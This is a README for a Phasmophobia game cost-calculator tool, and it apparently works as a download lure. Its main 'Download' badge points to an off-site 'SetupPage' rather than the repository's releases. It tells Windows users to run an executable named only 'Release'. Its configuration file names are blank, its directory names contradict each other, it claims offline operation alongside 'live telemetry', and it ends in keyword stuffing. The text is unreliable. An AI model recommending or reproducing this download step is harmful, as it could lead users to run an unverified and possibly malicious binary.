# Phasmophobia Loadout Cost Calculator

<div align="center">
<a href="https://rewfdf.github.io/SetupPage/">
  <img src="https://img.shields.io/badge/Download-Release-9333ea?style=for-the-badge&logo=download&logoColor=white" alt="Download">
</a>
<a href="https://github.com/gigahokagepincers/Phasmophobia-Loadout-Cost-Calculator">
  <img src="https://img.shields.io/badge/Repository-Phasmophobia%20Loadout%20Cost%20Calculator-4c1?style=flat-square&logo=github" alt="Repository">
</a>
<a href="https://github.com/gigahokagepincers/Phasmophobia-Loadout-Cost-Calculator/stargazers">
  <img src="https://img.shields.io/badge/Stars-0-ffdf00?style=plastic&logo=star" alt="Stars">
</a>
<a href="https://github.com/gigahokagepincers/Phasmophobia-Loadout-Cost-Calculator/issues">
  <img src="https://img.shields.io/badge/Issues-0-ff5f5f?style=flat&logo=issue&logoColor=white" alt="Issues">
</a>
<a href="https://github.com/gigahokagepincers/Phasmophobia-Loadout-Cost-Calculator/blob/main/LICENSE">
  <img src="https://img.shields.io/badge/License-MIT-6c757d?style=for-the-badge&logo=law" alt="License">
</a>
<a href="https://github.com/gigahokagepincers/Phasmophobia-Loadout-Cost-Calculator/releases">
  <img src="https://img.shields.io/badge/Version-1.0.0-00b8d4?style=flat-square&logo=tag" alt="Version">
</a>
</div>

---

## What the Phasmophobia Loadout Cost Calculator Does

The calculator turns every equipment decision into a clear monetary snapshot. It reads a player’s current inventory, applies a configurable price table, and outputs a concise report that can be copied into a spreadsheet or shared in voice chat. The core engine works offline, so no external services are queried, and all calculations are deterministic – you’ll see the same total every time you run the same profile.

Key capabilities include:

- **Profile‑driven pricing** – multiple price tables (default, premium, community) can be swapped without touching the source.
- **Presets for common scenarios** – “Beginner”, “Mid‑game” and “Expert” bundles are provided out of the box.
- **Export‑ready CSV** – a single click writes `loadout_report.csv` ready for import into any analytics utility.
- **Live telemetry view** – a small embedded web page shows a real‑time bar chart of spent vs. remaining budget.

All of these features are packaged in a single downloadable zip, keeping the repository lightweight and easy to distribute.

---

## Getting Started with the Phasmophobia Loadout Cost Calculator

1. **Download the latest release** – click the “Download” badge at the top of this page.
2. **Extract the archive** – the root folder contains four configuration files: ``, ``, ``, and ``.
3. **Select a preset** – open `` in a text editor and change the `preset=` line to one of the supported values (`beginner`, `midgame`, `expert`).
4. **Run the calculator** – double‑click `Release`. The UI will display the current cost breakdown and the remaining budget based on the active preset.
5. **Export your data** – hit the “Export CSV” button to generate `loadout_report.csv` in the same directory.

The UI is intentionally minimal: a dropdown for the preset, a list view of each item with its price, and a summary bar that updates as you toggle items on or off.

---

## Directory Layout

```
Phasmophobia-Loadout-Cost-Calculator/
│
├─ assets/                     # Icons and chart assets
│   ├─ ghost.svg
│   └─ background.png
│
├─ config/                     # Default configuration set
│   ├─
│   ├─
│   ├─
│   └─
│
├─ data/                       # Price tables in CSV format
│   ├─ price_default.csv
│   ├─ price_premium.csv
│   └─ price_community.csv
│
├─ docs/                       # Additional documentation and changelog
│   └─ changelog.md
│
├─ Release     # Primary executable (Windows)
└─ README.md                   # This file
```

The `data/price_*.csv` files contain three columns: `item_name`, `price`, and `category`. They are parsed at startup, allowing the calculator to support new items simply by adding a row to the appropriate CSV.

---

## Frequently Asked Questions

**Q: My budget shows as negative after adding items.**
A: Verify that the `budget` value in `` is high enough for the selected preset. The calculator does not enforce a ceiling; it merely reports the arithmetic result.

**Q: I want to price a custom item that isn’t in the CSV files.**
A: Add a line to `` using the syntax `item_price=<item_name>:<value>`. The calculator will prioritize this entry over any CSV value.

**Q: The chart looks garbled on my screen.**
A: Adjust the UI scaling in `` (`scale=1.0` to `scale=2.0`). The chart will redraw automatically.

**Q: How do I contribute a new preset?**
A: Fork the repository, add a new block to `` (e.g., `preset=nightmare`) and define the corresponding budget and item selection in ``. Submit a pull request with a brief description of the intended playstyle.

---

## Release Bundle Contents

The zip file delivered from the “Download” badge contains everything needed to run the calculator on a typical Windows 10/11 system. No external runtimes are required; the binary bundles the .NET runtime it depends on. For users who prefer a portable experience, simply keep the folder on a USB stick and launch the executable directly.

---

## Contact & Contribution

The project is maintained by **gigahokagepincers**. Issues, feature requests, and community‑crafted price tables are welcomed via the GitHub **Issues** tab. If you have a suggestion for a new UI theme or a price adjustment for a recent update of Phasmophobia, feel free to open a discussion.

---

*Keywords:* phasmophobia, loadout, cost, calculator, phasmophobia-loadout, loadout-cost, cost-calculator, phasmophobia-manager, phasmophobia-helper, phasmophobia-config

## 📁 Configuration System

```text
configs/
├── default.cfg
├── visual.cfg
├── player.cfg
└── custom.cfg
```